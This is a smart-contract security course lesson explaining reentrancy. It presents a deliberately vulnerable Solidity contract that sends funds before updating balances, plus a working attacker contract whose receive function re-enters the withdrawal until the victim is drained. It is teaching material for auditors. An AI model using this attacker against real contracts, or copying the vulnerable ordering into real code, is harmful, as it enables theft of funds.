title: Exploit - Reentrancy

_Follow along with this video:_

Let's see if we can nail down this vulnerability. When we'd run `Slither` earlier, you may recall it had actually found something...

Run it again and we'll have a closer look.

```bash
slither .
```

Looking through the output, we can see `Slither` is in fact detecting things in our `refund` function!

### What is a re-entrancy attack and how does it work?

For this lesson we'll be heavily leaning on our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo for diagrams and examples to reference. Be sure to clone it so you can see how these vulnerabilities work locally.

Here's our example contract:

```js
contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}
```

Fairly simple. Under normal circumstances

User A (balance 10 ether) can deposit funds

1. deposit{value: 10 ether}

  :bruserBalance[UserA] = 10 ether
  :brcontract balance = 10 ether
  :brUser A balance = 0 ether

And then withdraw them

2. withdrawBalance

  :bruserBalance[UserA] = 0 ether
  :brcontract balance = 0 ether
  :brUser A balance = 10 ether

The order of operations is really important in these situations. In our `withdrawBalance` function, we see that the function is making an external call _before_ updating the state of the contract.

What this means, is that an attacker could have that external call be made in such a way that it triggers a call of the `withdrawBalance` function again (hence - reentrancy).

```js
contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
```

Consider the above attack contract. Seems pretty benign, but let's walk through what's actually happening.

1. Attacker calls the attack function which deposits 1 ether, then immediately withdraws it.

```js
function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }
```

2. The `ReentrancyVictim` contract does what's it's supposed to and received the deposit, then process the withdrawal. During this process the victim contract makes a call to the attacker's contract.

**NOTE: THIS IS BEFORE OUR BALANCE HAS BEEN UPDATED**

```js
(bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
```

What happens when a contract receives value? It's going have it's receive/fallback functions triggered. And what does our Attacker's receive function look like?

```js
receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
```

It calls the `withdrawBalance` function again! Because our previous `withdrawBalance` hasn't updated our balance yet, the contract will happily let us withdraw again.. and again .. and again until all funds are drained.

Let's look at this all put together.

### Wrap Up

Re-entrancy is a a big deal and it's very impactful when it happens. We're really going to nail down our understanding of this attack vector before moving on.

At it's most minimalistic, re-entrancy generates a loop that continually drains funds from a protocol.

Our next lesson is going to be a hands on example of this vulnerability in Remix. Let's see what this exploit is like in action.
